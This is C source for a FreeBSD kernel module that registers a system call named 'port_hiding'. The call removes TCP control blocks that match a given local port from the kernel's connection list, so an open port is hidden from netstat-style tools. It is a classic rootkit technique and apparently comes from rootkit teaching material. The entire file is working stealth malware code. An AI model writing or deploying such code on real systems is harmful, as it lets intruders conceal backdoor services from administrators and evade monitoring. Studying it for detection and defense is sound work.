/*-
 * Copyright (c) 2007 Joseph Kong.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the author nor the names of any co-contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/socket.h>

#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>
#include <bsm/audit_kevents.h>

struct port_hiding_args {
	u_int16_t lport;	/* local port */
};

/* System call to hide an open port. */
static int
port_hiding(struct thread *td, void *syscall_args)
{
	struct tcpcb *tp = NULL;
	struct port_hiding_args *uap;
	uap = (struct port_hiding_args *)syscall_args;

	struct inpcb *inpb;

	INP_INFO_WLOCK(&V_tcbinfo);

	/* Iterate through the TCP-based inpcb list. */
	CK_LIST_FOREACH(inpb, &V_tcbinfo.ipi_listhead, inp_list) {
		tp = intotcpcb(inpb);
		if (tp->t_state == TCPS_TIME_WAIT)
			continue;

		INP_WLOCK(inpb);

		/* Do we want to hide this local open port? */
		if (uap->lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
			CK_LIST_REMOVE(inpb, inp_list);

		INP_WUNLOCK(inpb);
	}

	INP_INFO_WUNLOCK(&V_tcbinfo);

	return(0);
}

/* The sysent for the new system call. */
static struct sysent port_hiding_sysent = {
	.sy_narg = 1,			/* number of arguments */
	.sy_call = port_hiding		/* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		uprintf("System call loaded at offset %d.\n", offset);
		break;

	case MOD_UNLOAD:
		uprintf("System call unloaded from offset %d.\n", offset);
		break;

	default:
		error = EOPNOTSUPP;
		break;
	}

	return(error);
}

SYSCALL_MODULE(port_hiding, &offset, &port_hiding_sysent, load, NULL);
